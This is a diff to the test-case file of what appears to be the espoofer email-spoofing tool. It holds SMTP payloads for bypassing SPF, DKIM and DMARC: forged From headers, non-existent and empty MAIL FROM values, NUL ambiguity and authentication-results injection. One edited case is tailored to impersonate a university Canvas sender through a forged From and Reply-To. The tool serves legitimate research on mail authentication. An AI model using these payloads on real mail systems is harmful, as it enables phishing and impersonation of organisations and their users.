@@ -18,8 +18,22 @@ test_cases = {
             "from_header": b"From: <admin@legitimate.com>\r\n",
             "to_header": b"To: <victim@victim.com>\r\n",
             "subject_header": b"Subject: A1: Non-existent subdomain\r\n",
-            "body": b"Hi, this is a test message! Best wishes.\r\n",
+            "body": b"Hi, this is a test message with server_a1! Best wishes.\r\n",
             "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
+        },
+        "description": b"Non-existent subdomains in MAIL FROM, refer to A1 attack in the paper."
+    },
+    "server_a1_1": {
+        "helo": b"helo.attack.com",
+        "mailfrom": b"<any@mailfrom.notexist.legitimate.com>",
+        "rcptto": b"<victim@victim.com>",
+        #"dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <admin@legitimate.com>"},
+        "data": {
+            "from_header": b"From: <admin@legitimate.com>\r\n",
+            "to_header": b"To: <victim@victim.com>\r\n",
+            "subject_header": b"Subject: A1: Non-existent subdomain\r\n",
+            "body": b"Hi, this is a test message with server_a1! Best wishes.\r\n",
+            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: multipart/alternative;\r\n boundary="--==_this_is_the_separate_line";\r\n charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
         },
         "description": b"Non-existent subdomains in MAIL FROM, refer to A1 attack in the paper."
     },
@@ -32,7 +46,7 @@ test_cases = {
             "from_header": b"From: <admin@legitimate.com>\r\n",
             "to_header": b"To: <victim@victim.com>\r\n",
             "subject_header": b"Subject: A2: empty MAIL FROM address\r\n",
-            "body": b"Hi, this is a test message! Best wishes.\r\n",
+            "body": b"Hi, this is a test message with server_a2! Best wishes.\r\n",
             "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
         },
         "description": b"Empty MAIL FROM addresses, refer to A2 attack in the paper."
@@ -46,7 +60,7 @@ test_cases = {
             "from_header": b"From: <admin@legitimate.com>\r\n",
             "to_header": b"To: <victim@victim.com>\r\n",
             "subject_header": b"Subject: A3: NUL ambiguity\r\n",
-            "body": b'Hi, this is a test message! Best wishes.\r\n',
+            "body": b'Hi, this is a test message with server_a3! Best wishes.\r\n',
             "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: multipart/alternative; boundary="001a113db9c28077e7054ee99e9c"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
         },
         "description": b"NUL ambiguity, refer to A3 attack in the paper."
@@ -60,7 +74,7 @@ test_cases = {
             "from_header": b"From: <admin@legitimate.com>\r\n",
             "to_header": b"To: <victim@victim.com>\r\n",
             "subject_header": b"Subject: A4: DKIM authentication results injection using single quote\r\n",
-            "body": b'Hi, this is a test message! Best wishes.\r\n',
+            "body": b'Hi, this is a test message with server_a4! Best wishes.\r\n',
             "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: multipart/alternative; boundary="001a113db9c28077e7054ee99e9c"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
         },
         "description": b"DKIM authentication results injection using single quote, refer to A4 attack in the paper."
@@ -74,7 +88,7 @@ test_cases = {
             "from_header": b"From: <admin@legitimate.com>\r\n",
             "to_header": b"To: <victim@victim.com>\r\n",
             "subject_header": b"Subject: A5: SPF authentication results injection using parenthese\r\n",
-            "body": b"Hi, this is a test message! Best wishes.\r\n",
+            "body": b"Hi, this is a test message with server_a5! Best wishes.\r\n",
             "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
         },
         "description": b"SPF authentication results injection using parenthese, refer to A5 attack in the paper."
@@ -304,7 +318,7 @@ test_cases = {
             "to_header": b"To: <victim@victim.com>\r\n",
             "subject_header": b"Subject: client A2: Multiple address in From header\r\n",
             "body": b"Hi, this is a test message! Best wishes.\r\n",
-            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <s@sender.legitimate.com>\r\nContent-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
+            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
         },
         "description": b"Spoofing via an email service account using multiple address, refer to section 6.2 in the paper."
     },
@@ -318,7 +332,7 @@ test_cases = {
             "to_header": b"To: <victim@victim.com>\r\n",
             "subject_header": b"Subject: client A3: Spoofing via an email service account\r\n",
             "body": b"Hi, this is a test message! Best wishes.\r\n",
-            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <s@sender.legitimate.com>\r\nContent-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
+            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
         },
         "description": b"Spoofing via an email service account, refer to section 6.2 in the paper."
     },
@@ -345,11 +359,11 @@ test_cases = {
         
         
         "data": {
-            "from_header": b"From: <admin@example.com>\r\n",
+            "from_header": b"From: <admin@example.com>, <dantynoel@sjtu.edu.cn>\r\n",
             "to_header": b"To: <victim@victim.com>\r\n",
             "subject_header": b"Subject: client A3: Spoofing via an email service account\r\n",
             "body": b"Hi, this is a test message! Best wishes.\r\n",
-            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: multipart/alternative;\r\n boundary="--==_this_is_the_separate_line";\r\n charset="UTF-8"\r\nReply-To: canvas+1145141919810~nice@sjtu.edu.cn\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nContent-Transfer-Encoding: 7bit\r\nAuto-Submitted: auto-generated\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
+            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@example.com>\r\nContent-Type: multipart/alternative;\r\n boundary="--==_this_is_the_separate_line";\r\n charset="UTF-8"\r\nReply-To: canvas+1145141919810~nice@sjtu.edu.cn\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nContent-Transfer-Encoding: 7bit\r\nAuto-Submitted: auto-generated\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
         },
         "description": b"Spoofing via an email service account, refer to section 6.2 in the paper."
 
